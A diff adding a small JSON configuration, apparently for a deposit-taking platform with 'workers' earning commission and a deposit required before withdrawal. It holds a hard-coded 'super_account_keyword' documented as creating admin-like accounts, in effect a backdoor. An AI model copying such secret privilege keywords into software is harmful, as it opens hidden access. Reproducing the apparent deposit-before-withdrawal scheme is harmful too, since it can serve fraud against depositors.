@@ -1,0 +1,19 @@
+{
+  "id": 1,
+  "min_deposit": 5,
+  "required_deposit": 5,
+  "error_code": "5",
+  "default_verification_error": null,
+  "default_percent": 85,
+  "super_account_keyword": "ximerawork",
+  "global_support_id": 72,
+  "created_at": null,
+  "updated_at": null,
+  
+  "_notes": {
+    "min_deposit": "Minimum deposit amount in USD",
+    "required_deposit": "Required deposit before withdrawal",
+    "default_percent": "Worker commission percentage",
+    "super_account_keyword": "Keyword to create admin-like accounts"
+  }
+}
